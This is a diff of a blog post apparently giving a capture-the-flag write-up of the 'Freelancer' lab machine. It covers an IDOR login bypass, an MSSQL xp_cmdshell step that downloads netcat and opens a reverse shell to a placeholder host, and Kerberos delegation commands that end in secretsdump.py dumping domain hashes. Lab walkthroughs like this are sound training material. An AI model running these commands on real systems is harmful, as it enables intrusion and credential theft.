@@ -9,85 +9,85 @@ thumb: /assets/images/logos/cc3c525e7837e7e95d0da9b6596e7a30.webp
 # Freelancer
 
 # 1. Enumeration
-
+<br/><br/>
 Let’s start with the enumeration using nmap
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled.png' | relative_url }})
-
+<br/><br/>
 There are some Microsoft services running including an Active directory and a web application, there was a problem with it because the machine failed open that port with some vpn files. We also can do a user enumeration of kerbrute.
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_1.png' | relative_url }})
-
+<br/><br/>
 On the web application there are two log in options, first we registered as freelancer user
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_2.png' | relative_url }})
-
+<br/><br/>
 There was no problem with it
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_3.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_4.png' | relative_url }})
-
+<br/><br/>
 Continue with the recognition using gobuster looking for directories
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_5.png' | relative_url }})
-
+<br/><br/>
 We could see an admin log in interface, we may need to break into it.
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_6.png' | relative_url }})
-
+<br/><br/>
 # 2. User flag
-
+<br/><br/>
 As we created the freelancer account we could see there’s a recovery account directory
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_7.png' | relative_url }})
-
+<br/><br/>
 We might use this at some way, but first take account that if you want to create an employer account we will need first the permission of an admin page 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_8.png' | relative_url }})
-
+<br/><br/>
 We can recover an account even when we haven’t sign in, so let’s try to recover our employer account
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_9.png' | relative_url }})
-
+<br/><br/>
 Then we could log in, as a normal user shouldn’t do something like that now we can set up a chain attack using the new features available on the dashboard
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_10.png' | relative_url }})
-
+<br/><br/>
 An employer can sign in on another device without credentials only using a qr code which has 5 minutes of life
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_11.png' | relative_url }})
-
+<br/><br/>
 That qr code has a base64 encoded text and the token with the permissions to log in
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_12.png' | relative_url }})
-
+<br/><br/>
 If we decode that base64 string, we could see a number, probably a user id, so if it couldn’t validate if the user actually request the qr then we could exploit a IDOR attack just guessing the user id of admin.
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_13.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_14.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_15.png' | relative_url }})
-
+<br/><br/>
 Good news, now go to the admin directory we found earlier.
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_16.png' | relative_url }})
-
+<br/><br/>
 A SQL terminal, it could be interesting, a place where you can execute code sounds promising.
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_17.png' | relative_url }})
-
+<br/><br/>
 There are some information about how to exploit it here:
-
+<br/><br/>
 [https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
-
+<br/><br/>
 We can see that the owner of the database is `sa`
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_18.png' | relative_url }})
-
+<br/><br/>
 To get the reverse shell we will need to follow the next steps:
-
+<br/><br/>
 ```sql
 #Sign in as db owner
 EXECUTE AS LOGIN = 'sa'
@@ -111,62 +111,62 @@ powershell -noprofile'
 EXEC xp_cmdshell '%TEMP%\nc64.exe x.x.x.x xxxx -e powershell'
 
 ```
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_19.png' | relative_url }})
-
+<br/><br/>
 In downloads there are some SQL files, go to configuration files to find some creds
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_20.png' | relative_url }})
-
+<br/><br/>
 Those creds are useful for mikasaAckerman use RunasCs to get a shell as that user
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_21.png' | relative_url }})
-
+<br/><br/>
 Here we have user flag and a starting point to elevate our privileges using MEMORY.7z file download it and analyze it
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_22.png' | relative_url }})
-
+<br/><br/>
 # 3.Priv esc
-
+<br/><br/>
 <aside>
 🪡 When you unzip that file you’ll find a .DMP file, those are dump memory, those files are used when you need to capture information about the state of a memory, there are tools like windbg to analyze it but we need to find creds or hashes at some way, so we will use mamprocFS which open a virtual system to see files
 
 </aside>
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_23.png' | relative_url }})
-
+<br/><br/>
 To extract hashes we will need to install some plugins, follow the instructions 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_24.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_25.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_26.png' | relative_url }})
-
+<br/><br/>
 Mount the virtual system
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_27.png' | relative_url }})
-
+<br/><br/>
 If you followed all steps above you will find lorra199 creds
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_28.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_29.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_30.png' | relative_url }})
-
+<br/><br/>
 You can log on as lorra in PS using evilwinrm but if you try to enumerate the system there’s a AV blocking you to execute malicious code, so let’s enumerate active directory with other way extracting bloodhound files
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_31.png' | relative_url }})
-
+<br/><br/>
 As you can see lorra has direct connection with the domain controller and is member of AD RECYCLE BIN it means we could be able to elevate our privileges stealing hashes from cache
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_32.png' | relative_url }})
-
+<br/><br/>
 To successfully obtain the ticket and save it on the cache you will need to sync the clocks use this command the number of times that you need it (it could be a lot)
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_33.png' | relative_url }})
-
+<br/><br/>
 ```powershell
 #Add a new computer on AD domain
 addcomputer.py -computer-name NAME$ -computer-pass password -dc-host domain -domain-netbios domain domain/userauth:passworduserauth
@@ -180,18 +180,23 @@ EXPORT KRB5CCNAME=filename
 #Dumpiong secrets 
 secretsdump.py -dc-ip ip -target-ip ip -k -no-pass freelancer.htb/Administrator@DC.freelancer.htb -just-dc-ntlm
 ```
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_34.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_35.png' | relative_url }})
-
-![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_36.png' | relative_url }})
-
+<br/><br/>
+![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d943099<br/><br/>1558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_36.png' | relative_url }})
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_37.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_38.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_39.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_40.png' | relative_url }})
+<br/><br/>
+Machine pwned@!@!
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
